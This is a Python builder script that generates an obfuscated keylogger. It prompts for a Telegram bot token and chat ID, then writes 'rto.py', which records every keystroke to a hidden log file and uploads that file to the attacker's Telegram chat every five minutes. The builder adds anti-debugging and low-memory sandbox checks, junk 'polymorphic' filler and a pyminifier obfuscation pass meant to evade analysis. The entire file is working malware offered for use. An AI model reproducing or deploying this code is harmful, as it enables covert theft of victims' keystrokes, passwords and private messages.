import os as _o
import subprocess as _s
from cryptography.fernet import Fernet as _F
import ctypes as _c
import time as _tm
import random as _rd
import keyboard as _k
import threading as _th
import datetime as _d
import requests as _r

def _junk():
    _x = _rd.randint(0, 100)
    if _x > 50:
        print("Junk executed.")
    else:
        pass

def _anti_debug():
    try:
        if _c.windll.kernel32.IsDebuggerPresent():
            print("Debugger detected! Exiting...")
            _o._exit(1)
    except:
        pass

def _check_env():
    try:
        ram = _o.sysconf('SC_PAGE_SIZE') * _o.sysconf('SC_PHYS_PAGES') / (1024 ** 3)
        if ram < 2:
            print("Suspicious environment detected! Exiting...")
            _o._exit(1)
    except:
        pass

def _resolve_api():
    try:
        _c.windll.kernel32.GetModuleHandleW(None)
    except:
        pass

def _poly():
    if _rd.choice([True, False]):
        _tm.sleep(0.1)
    else:
        pass

def _encrypt(s, key):
    cipher = _F(key)
    return cipher.encrypt(s.encode()).decode()

def _ask_api():
    _junk()
    _anti_debug()
    _check_env()
    _resolve_api()
    _poly()
    example_api = _encrypt("123456789:ABCdefGhIJKlmNoPQRstuVWXyz", _key)
    print(f"Enter your Telegram Bot API key. Example: {example_api}")
    api = input("API Key: ").strip()
    return api

def _ask_chat():
    _junk()
    _anti_debug()
    _check_env()
    _resolve_api()
    _poly()
    example_chat = _encrypt("123456789", _key)
    print(f"Enter your Chat ID. Example: {example_chat}")
    chat = input("Chat ID: ").strip()
    return chat

def _gen_key():
    _junk()
    _anti_debug()
    _check_env()
    _resolve_api()
    _poly()
    key = _F.generate_key()
    with open("secret.key", "wb") as f:
        f.write(key)
    print("Fernet key generated and saved to 'secret.key'. Keep it secure!")
    return key

def _create_script(key, api, chat):
    _junk()
    _anti_debug()
    _check_env()
    _resolve_api()
    _poly()
    script = f"""
from cryptography.fernet import Fernet as _F
import keyboard as _k
import threading as _th
import datetime as _d
import os as _o
import time as _tm
import requests as _r

key = {key}
cipher = _F(key)

enc_api = cipher.encrypt(b"{api}")
enc_chat = cipher.encrypt(b"{chat}")

api = cipher.decrypt(enc_api).decode()
chat = cipher.decrypt(enc_chat).decode()

script_dir = _o.path.dirname(_o.path.abspath(__file__))
log_file = _o.path.join(script_dir, "hidden_log.dat")

buf_lock = _th.Lock()
buf = ""

def _send_log():
    try:
        if not _o.path.exists(log_file) or _o.path.getsize(log_file) == 0:
            return
        with open(log_file, "rb") as f:
            log = f.read()
        url = f'https://api.telegram.org/bot{{api}}/sendDocument'
        payload = {{
            'chat_id': chat,
            'caption': f'Log data {{_d.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}}'
        }}
        files = {{'document': ('log.txt', log)}}
        resp = _r.post(url, files=files, data=payload)
        if resp.status_code == 200:
            print("Log sent.")
        else:
            print("Failed to send log:", resp.text)
    except Exception as e:
        print("Error sending log:", e)

def _log_key(event):
    global buf
    try:
        with buf_lock:
            if event.name == "space":
                buf += " "
            elif event.name == "enter":
                buf += "\\n"
            elif len(event.name) == 1:
                buf += event.name
            elif event.name == "backspace":
                buf = buf[:-1]
    except Exception as e:
        print("Error logging key:", e)

def _write_buf():
    global buf
    while True:
        try:
            with buf_lock:
                if buf:
                    with open(log_file, "a") as f:
                        ts = _d.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        f.write(f"{{ts}}: {{buf}}\\n")
                        buf = ""
        except Exception as e:
            print("Error writing to log:", e)
        _tm.sleep(5)

def _periodic_send():
    while True:
        _send_log()
        _tm.sleep(300)

if __name__ == "__main__":
    try:
        _th.Thread(target=_write_buf, daemon=True).start()
        _th.Thread(target=_periodic_send, daemon=True).start()
        _k.on_release(_log_key)
        _k.wait()
    except KeyboardInterrupt:
        print("Script terminated.")
"""

    with open("rto.py", "w") as f:
        f.write(script)
    print("Script 'rto.py' created successfully.")

def _obfuscate():
    try:
        _s.run([
            "pyminifier",
            "--obfuscate",
            "--replacement-length=1",
            "--gzip",
            "rto.py",
            "-o",
            "rto_obfuscated.py"
        ], check=True)
        print("Script obfuscated successfully as 'rto_obfuscated.py'.")
    except Exception as e:
        print("Error during obfuscation:", e)

if __name__ == "__main__":
    _key = _gen_key()
    api = _ask_api()
    chat = _ask_chat()
    _create_script(_key, api, chat)
    _obfuscate()